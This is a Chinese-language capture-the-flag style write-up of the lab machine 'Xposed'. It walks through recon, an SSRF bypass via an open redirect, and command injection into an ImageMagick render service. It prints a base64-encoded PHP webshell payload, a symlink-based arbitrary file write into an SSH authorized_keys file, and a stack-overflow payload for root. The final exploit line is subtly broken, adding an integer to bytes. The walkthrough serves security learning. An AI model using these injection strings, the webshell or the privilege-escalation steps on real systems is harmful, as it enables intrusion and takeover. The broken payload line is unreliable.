---
layout: post
title: "[MAZE-SEC]Xposed靶机复盘"
date: 2026-10-21
categories: [MAZE-SEC]
excerpt: "MAZE-SEC社区靶机Xposed的复盘。"
---

```
靶机：Xposed
作者：Sublarge(群:321948805)
靶机ID：754
```

靶机名叫Xposed不过和安桌的那个Xposed框架关系不大，应该是因为靶机web端的应用才这么取名的？靶机web部分和横向移动的部分比较有意思因此复盘一下。

# User

## 信息收集

总之，nmap先简单扫描一下，开放了22的ssh端口和80的http端口。

```bash
~$ nmap -sT -p- -sV -v 192.168.5.9
Nmap scan report for 192.168.5.9 (192.168.5.9)
Host is up (0.0067s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.68 ((Unix))
MAC Address: E8:B0:C5:A2:6E:21 (Intel Corporate)
```

先去web看看，如图，可以注册或者登录，右上角还有上传、导入等功能，但是需要登录了才能使用，

![ref1](/assets/images/2026-10-21-Xposed-review/ref1.webp)

既然能注册，那我们就先不尝试爆破，随便注册一个帐号：admin:123456，再登录进去看看，期间顺便用dirsearch跑一跑目录扫描：

```bash
~$ dirsearch -u http://192.168.5.9/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/b14ckb0x/reports/http_192.168.5.9/__26-10-21_11-00-46.txt

Target: http://192.168.5.9/

[11:00:46] Starting: 
[11:00:49] 403 -  314B  - /.ht_wsr.txt
[11:00:49] 403 -  314B  - /.htaccess.bak1
[11:00:49] 403 -  314B  - /.htaccess.orig
[11:00:50] 403 -  314B  - /.htaccess.save
[11:00:50] 403 -  314B  - /.htaccess.sample
[11:00:50] 403 -  314B  - /.htaccess_orig
[11:00:50] 403 -  314B  - /.htaccess_extra
[11:00:50] 403 -  314B  - /.htaccess_sc
[11:00:50] 403 -  314B  - /.htaccessOLD
[11:00:50] 403 -  314B  - /.htaccessBAK
[11:00:50] 403 -  314B  - /.htaccessOLD2
[11:00:50] 403 -  314B  - /.htm
[11:00:50] 403 -  314B  - /.html
[11:00:50] 403 -  314B  - /.htpasswd_test
[11:00:50] 403 -  314B  - /.htpasswds
[11:00:50] 403 -  314B  - /.httr-oauth
[11:01:12] 301 -  349B  - /assets  ->  http://192.168.5.9/assets/
[11:01:12] 403 -  314B  - /assets/
[11:01:16] 200 -  820B  - /cgi-bin/printenv
[11:01:16] 200 -    1KB - /cgi-bin/test-cgi
[11:01:28] 302 -    0B  - /go.php  ->  /
[11:01:32] 302 -    0B  - /import.php  ->  /login.php?next=%2Fimport.php
[11:01:32] 301 -  351B  - /includes  ->  http://192.168.5.9/includes/
[11:01:32] 403 -  314B  - /includes/
[11:01:38] 200 -    2KB - /login.php
[11:01:39] 302 -    0B  - /logout.php  ->  /
[11:01:53] 302 -    0B  - /profile.php  ->  /login.php?next=%2Fprofile.php
[11:01:56] 200 -    2KB - /register.php
[11:01:59] 403 -  314B  - /server-status/
[11:01:59] 403 -  314B  - /server-status
[11:02:04] 302 -    0B  - /status.php  ->  /login.php?next=%2Fstatus.php
[11:02:11] 302 -    0B  - /upload.php  ->  /login.php?next=%2Fupload.php
[11:02:11] 301 -  350B  - /uploads  ->  http://192.168.5.9/uploads/
[11:02:11] 403 -  314B  - /uploads/

Task Completed
```

暴露出来了很多，注意到这里有个奇怪的go.php，访问之后302跳转到主页，这里我先去看了cgi-bin目录的内容，

## CGI

虽然和本靶机无关，但是写一个这个可以填补我博客从来没有出现过的知识点，也顺便讲明白为什么在本靶机cgi无用。

CGI全称Common Gateway Interface（公共网关接口），是一种协议规范，从历史上看，它的出现和发展介于静态页面和动态页面之间，是早期实现web动态页面的唯一标准方式，简单来说，工作方式是：

1. 用户向服务器发起请求。
2. web端服务器判别是否是CGI请求，如果是就额外启动一个外部的程序（很多，比如C程序、Shell脚本）对CGI请求进行解析并执行，期间用户输入的请求数据的传递是通过环境变量和标准输入传给外部程序的。
3. 程序或脚本处理完后，将结果通过标准输出打印出来，然后交由服务器传递最终返回客户端。

想法很好，不过每次接收到请求都要启动一个进程会导致性能问题，其次将请求直接交由外部程序处理，没有任何安全防护手段、隔离，如果外部程序一旦出现命令注入、环境变量注入等漏洞，会导致服务器直接被拿下。所以现在已经不用cgi了，现代有进程池等手段，不过这里不展开了。

回到靶机内容，访问`http://192.168.5.9/cgi-bin/printenv`，出现：

```perl
#

# To permit this cgi, replace # on the first line above with the
# appropriate #!/path/to/perl shebang, and on Unix / Linux also
# set this script executable with chmod 755.
#
# ***** !!! WARNING !!! *****
# This script echoes the server environment variables and therefore
# leaks information - so NEVER use it in a live server environment!
# It is provided only for testing purpose.
# Also note that it is subject to cross site scripting attacks on
# MS IE and any other browser which fails to honor RFC2616. 

##
##  printenv -- demo CGI program which just prints its environment
##
use strict;
use warnings;

print "Content-type: text/plain; charset=iso-8859-1\n\n";
foreach my $var (sort(keys(%ENV))) {
    my $val = $ENV{$var};
    $val =~ s|\n|\\n|g;
    $val =~ s|"|\\"|g;
    print "${var}=\"${val}\"\n";
}
```

发现不知道出于什么原因，这个应该默认直接打印环境变量的cgi程序直接把自己源代码打印出来了，而并没有执行脚本的内容，为了确认的确没有执行，我去看了`/cgi-bin/test-cgi`，发现也是打印源代码，且尝试fuzz一些参数页面都无变化，证明该靶机cgi程序不可控，需换攻击路径。

## upload功能fuzz

剩下的显眼的功能就是upload和import了，以下是upload的界面，

![ref2](/assets/images/2026-10-21-Xposed-review/ref2.webp)

unload功能，可以选择上传一个图像文件，并命名标题，不过这个标题并不是真实文件名，而是展示在首页的图片名称。

两个功能都比较有测试意义，考虑到是php网站，我优先测试了upload功能，尝试上传了webshell以及进行一下绕过，最后发现它属于后端检测，检测文件头的魔数，上传的文件名会经过重新渲染并强制重命名为安全的图片拓展名jpg、png等，同时试着在主页访问上传的图片码会发现没有被解析执行。因此上传webshell的方式暂时认定走不通，与此同时在主页有一个有趣的发现，go.php的跳转能指定参数，似乎有点意思。

![ref4](/assets/images/2026-10-21-Xposed-review/ref4.webp)

## import功能fuzz

![ref3](/assets/images/2026-10-21-Xposed-review/ref3.webp)

import功能，可以选择从远程url导入图片，也同样可以命名没用的标题。

测试import功能，既然能fetch url，那肯定先测试有无SSRF，然后很快就发现界面下面的提示：`Loopback and link-local hosts are filtered. Redirects are followed.`。那几乎明摆着告诉我们是用一个302当跳板去访问本地地址了，302跳转绕过SSRF限制也是一个常规操作，原理就是有些SSRF只限制了接收到的第一个url的访问，一旦开发者允许了相关功能的重定向却又不检查url最终跳转目的，就会导致可以通过302绕过，和平时提权的时候通过符号链接写入本来不可写入的文件很像。

## import功能SSRF深入利用

在status.php可以看到靶机开放了127.0.0.1:9911端口，但是只能本地或者内网访问，

![ref5](/assets/images/2026-10-21-Xposed-review/ref5.webp)

而搭配上SSRF与其自带的302跳转界面go.php，我们就可以实现绕过内网访问限制，很快就能获得更多信息：内部渲染图片的端点，以及这个端点的一些参数：caption、w、src。

![ref6](/assets/images/2026-10-21-Xposed-review/ref6.webp)

三个参数都fuzz一下，大概能知道src是传本地的图片路径，captions是传的注释文本，w是图片尺寸，此外还知道了渲染是交给ImageMagick处理的（报错中的magick），ImageMagick是一个开源的图像处理软件，主要以命令行的形式交互。以下是其中一次fuzz中的请求与响应，此次fuzz尝试读取/etc/passwd文件，结果证明src参数会被传入先经过检查是合法路径才传递给ImageMagick，并且无法通过src参数进行任意文件读取。

```
Req:
http://192.168.5.9/go.php?u=http://127.0.0.1:9911/render?src=/etc/passwd
Res:
{
  "ok": false,
  "job_id": "8dced0cc23b549b29fff26c332a02a55",
  "returncode": 1,
  "stdout": "",
  "stderr": "magick: no decode delegate for this image format `/etc/passwd' @ error/constitute.c/ReadImage/739.\n",
  "elapsed": 0.07
}
```

此时还有两个思路：一是继续对其余参数做注入测试，二是ImageMagick存在历史漏洞，处理特定恶意文件时可能会导致RCE，配合upload功能也许可以实现rce。我先尝试了后者，但是打了众多POC无果，从响应来看ImageMagick应该版本较新。

## 参数注入打入webshell

接下来构造正常的src参数，上传图片后可以从status.php得知：

```bash
2026-10-21 14:45:37,925 publisher INFO published /var/lib/xposed/staging/3ed3071e62eb49488ef146c804924c09.jpg -> /var/www/localhost/htdocs/uploads/thumbs/3ed3071e62eb49488ef146c804924c09.jpg
```

上传的路径是`/var/www/localhost/htdocs/uploads/thumbs/xxx.jpg`，因此直接用这个构造：

```
Req:
http://192.168.5.9/go.php?u=http://127.0.0.1:9911/render?src=/var/www/localhost/htdocs/uploads/thumbs/3ed3071e62eb49488ef146c804924c09.jpg&w=64&caption=h
Res:
{
  "ok": false,
  "job_id": "0cd381a9a5b34d30917a9ad54d6e99e0",
  "returncode": 1,
  "stdout": "",
  "stderr": "magick: unable to read font `' @ error/annotate.c/RenderFreetype/1704.\n",
  "elapsed": 0.01
}
```

注意请求方式是post，所以`&`需要双重url编码，然后可以发现提示里报错说多了一个单引号，可知应该确实拼接了某个参数，最后试出来是caption，然后就可以通过闭合单引号和注释的方式去进行命令注入，最后试出来：

```
Req:
http://192.168.5.9/go.php?u=http://127.0.0.1:9911/render?src=/var/www/localhost/htdocs/uploads/thumbs/3ed3071e62eb49488ef146c804924c09.jpg%26w=64%26caption=h';id;%2523
final：
http://127.0.0.1:9911/render?src=/var/www/localhost/htdocs/uploads/thumbs/3ed3071e62eb49488ef146c804924c09.jpg&w=64&caption=h';id;%23
Res:
{
  "ok": false,
  "job_id": "203f4ca7821445e9bcb8b648d310bc0f",
  "returncode": 0,
  "stdout": "uid=101(apache) gid=102(apache) groups=82(www-data),102(apache),102(apache)\n",
  "stderr": "magick: MissingArgument `-annotate' at CLI arg 10 @ fatal/magick-cli.c/ProcessCommandOptions/677.\n",
  "elapsed": 0.01
}
```

url编码得注意一下，除了`&`外，`#`还要三重编码，可以参考响应里的final部分去构造，最终确保发送的是%23。写入webshell：

```
caption=x';echo PD9waHAgZWNobyAiSTk5MU9LOiI7IHN5c3RlbSgkX0dFVFsiYyJdKTsgPz4=|base64 -d>/var/www/localhost/htdocs/uploads/i991.php;#
```

webshell读取userflag `flag{user-b80577e08d41f99a450bba9989459202}`。

# Root

 apache用户权限较低，需要提权到普通用户以及root，提权之前先继续做信息收集，status.php中提到了一个publisher，从描述看，publisher负责把渲染好的图片复制到上传的区域给web首页加载。可以先从分析这个publisher开始，刚好/opt/xposed/publisher处就有其源码，且由passwd可知有个publisher用户，再分析服务可知正是publisher运行着下面的publisher.py，所以这个方向应该是对的，下面主要分析看看能不能通过publisher.py的漏洞拿到publisher用户。

## publisher.py分析

由于太长，这里不贴源码。只贴分析时的重要部分：

```python
SOCKET = "/run/xposed/publisher.sock" 
TOKEN_FILE = "/etc/xposed/publisher.token" 
STAGING = "/var/lib/xposed/staging" 
UPLOADS = "/var/www/localhost/htdocs/uploads" 

def inside(path: str, root: str) -> bool:
    return os.path.commonpath([path, root]) == root and path != root

class PublisherHandler(socketserver.StreamRequestHandler):
    def handle(self) -> None:
        line = self.rfile.readline(MAX_LINE)
        if not line:
            return        
        try:
            req = json.loads(line.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError):
            self.reply({"ok": False, "error": "bad request"})
            return        
        if not hmac.compare_digest(str(req.get("token", "")), TOKEN):
            self.reply({"ok": False, "error": "unauthorized"})
            return        
        if req.get("op") == "ping":
            self.reply({"ok": True, "pong": True, "version": VERSION})
            return        
        src = str(req.get("src", ""))
        dst = str(req.get("dst", ""))
        
        if not src or not dst:
            self.reply({"ok": False, "error": "missing fields"})
            return        
        src_real = os.path.realpath(src) #realpasth会返回绝对路径，但同时也会解析符号链接
        if not inside(src_real, STAGING):#源文件的真实路径要包含在/var/lib/xposed/staging内
            self.reply({"ok": False, "error": "source outside staging"})
            return        
        if not os.path.isfile(src_real):
            self.reply({"ok": False, "error": "source not found"})
            return        
        dst_abs = os.path.abspath(dst)#规范化路径，且不处理符号链接
        if not inside(dst_abs, UPLOADS):#目的文件的规范化路径要包含在/var/www/localhost/htdocs/uploads内
            self.reply({"ok": False, "error": "destination outside uploads"})
            return        
        try:
            os.makedirs(os.path.dirname(dst_abs), exist_ok=True)
            shutil.copyfile(src_real, dst_abs)#copyfile默认跟随源文件符号链接，会复制符号链接指向的实际内容
            os.chown(dst_abs, os.getuid(), os.getgid())#改变复制后的文件uid和gid
            os.chmod(dst_abs, 0o644)
        except OSError as exc:
            log.error("publish failed src=%s dst=%s: %s", src_real, dst_abs, exc)
            self.reply({"ok": False, "error": "publish failed"})
            return        
        log.info("published %s -> %s", src_real, dst_abs)
        self.reply({"ok": True, "dst": dst_abs})
```

分析源码可以看到：

1. os.path.realpasth会返回绝对路径，但同时也会解析符号链接
2. 源文件的真实路径要包含在/var/lib/xposed/staging内
3. 目的文件的规范化路径要包含在/var/www/localhost/htdocs/uploads内
4. copyfile默认跟随源文件符号链接，会复制符号链接指向的实际内容
5. 最后调用os.chown改变复制后的文件uid和gid为当前进程的uid、gid，实际上就是改为publisher

因此，可以利用目的dst不校验文件的跟随符号链接的地址，构造一个在/var/www/localhost/htdocs/uploads文件夹内的文件，而该文件实际跟随符号链接指向其它的地址，同时，apache用户可以读写/run/xposed/publisher.sock这个socket，并且还能读/etc/xposed/publisher.token。

我们可以利用apache用户调用这个socket，并在合法的/var/lib/xposed/staging路径内构造一个文件，然后创建目的文件/var/www/localhost/htdocs/uploads/xxx的软链接指向/其它/文件夹/xxx，那么就可以写入文件到其它地方。

```
构造实例，这里用来写ssh公钥
src:/var/lib/xposed/staging/ssh_key.pub
dst:/var/www/localhost/htdocs/uploads/ssh_key/.ssh/authorized_keys
构造的符号链接：
ln -sfn /home/publisher /var/www/localhost/htdocs/uploads/ssh_key
这样复制到ssh_key文件夹下的内容，实际上会被复制到publisher下，同时构造的dst也满足了前缀检查。由此便可写入公钥  
```

## xposed-hook栈溢出提权

获得publisher用户以后可以在/usr/local/bin下找到一个xpose-hook，简单分析就能发现这个程序存在栈溢出，并且内部有shell函数，结合实际上xpose-hook以root运行，我们用ret2text pwn掉以后就能获得root。

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF

  write(1, "xposed-hook: manifest> ", 0x17u);
  if ( read(0, buf, 0x100u) <= 0 )
    return 1;
  write(1, "loading module\n", 0xFu);
  return 0;
}
```

sub_4011AD就是目标函数

```c
void __noreturn sub_4011AD() { setgid(0); setuid(0); execl("/bin/sh", "sh", 0); _exit(1); }
```

最后payload，pwn完后提权到root

```python
payload = b'A' * 64 + 0xdeadbeef + p64(ret_gadget) + p64(0x4011ad)
```


## publisher.py完整源码

```python
#!/usr/bin/env python3 
"""xposed-publisher — root publish agent. The web front-end hands finished darkroom renders to this agent over a Unix socket. It authenticates with a shared token and moves the render into the public uploads tree. 
""" 
import hmac 
import json 
import logging 
import os 
import pwd 
import shutil 
import socketserver 
SOCKET = "/run/xposed/publisher.sock" 
TOKEN_FILE = "/etc/xposed/publisher.token" 
STAGING = "/var/lib/xposed/staging" 
UPLOADS = "/var/www/localhost/htdocs/uploads" 
VERSION = "1.3.0" 
MAX_LINE = 65536 
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s publisher %(levelname)s %(message)s",
)
log = logging.getLogger("publisher")

try:
    APACHE = pwd.getpwnam("apache")
    APACHE_GID = APACHE.pw_gid
except KeyError:
    APACHE_GID = 102

try:
    with open(TOKEN_FILE, "r", encoding="utf-8") as fh:
        TOKEN = fh.read().strip()
except OSError as exc:
    raise SystemExit(f"cannot read publisher token: {exc}") from exc

def inside(path: str, root: str) -> bool:
    return os.path.commonpath([path, root]) == root and path != root

class PublisherHandler(socketserver.StreamRequestHandler):
    def reply(self, payload: dict) -> None:
        self.wfile.write(json.dumps(payload).encode("utf-8") + b"\n")

    def handle(self) -> None:
        line = self.rfile.readline(MAX_LINE)
        if not line:
            return        
        try:
            req = json.loads(line.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError):
            self.reply({"ok": False, "error": "bad request"})
            return        
        if not hmac.compare_digest(str(req.get("token", "")), TOKEN):
            self.reply({"ok": False, "error": "unauthorized"})
            return        
        if req.get("op") == "ping":
            self.reply({"ok": True, "pong": True, "version": VERSION})
            return        
        src = str(req.get("src", ""))
        dst = str(req.get("dst", ""))
        
        if not src or not dst:
            self.reply({"ok": False, "error": "missing fields"})
            return        
        src_real = os.path.realpath(src)
        if not inside(src_real, STAGING):
            self.reply({"ok": False, "error": "source outside staging"})
            return        
        if not os.path.isfile(src_real):
            self.reply({"ok": False, "error": "source not found"})
            return        
        dst_abs = os.path.abspath(dst)
        if not inside(dst_abs, UPLOADS):
            self.reply({"ok": False, "error": "destination outside uploads"})
            return        
        try:
            os.makedirs(os.path.dirname(dst_abs), exist_ok=True)
            shutil.copyfile(src_real, dst_abs)
            os.chown(dst_abs, os.getuid(), os.getgid())
            os.chmod(dst_abs, 0o644)
        except OSError as exc:
            log.error("publish failed src=%s dst=%s: %s", src_real, dst_abs, exc)
            self.reply({"ok": False, "error": "publish failed"})
            return        
        log.info("published %s -> %s", src_real, dst_abs)
        self.reply({"ok": True, "dst": dst_abs})

class PublisherServer(socketserver.ThreadingMixIn, socketserver.UnixStreamServer):
    daemon_threads = True

def main() -> None:
    os.makedirs(os.path.dirname(SOCKET), exist_ok=True)
    try:
        os.unlink(SOCKET)
    except FileNotFoundError:
        pass    
    server = PublisherServer(SOCKET, PublisherHandler)
    os.chmod(SOCKET, 0o660)
    os.chown(SOCKET, -1, APACHE_GID)
    log.info("xposed-publisher %s listening on %s", VERSION, SOCKET)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()

if __name__ == "__main__":
    main()
```
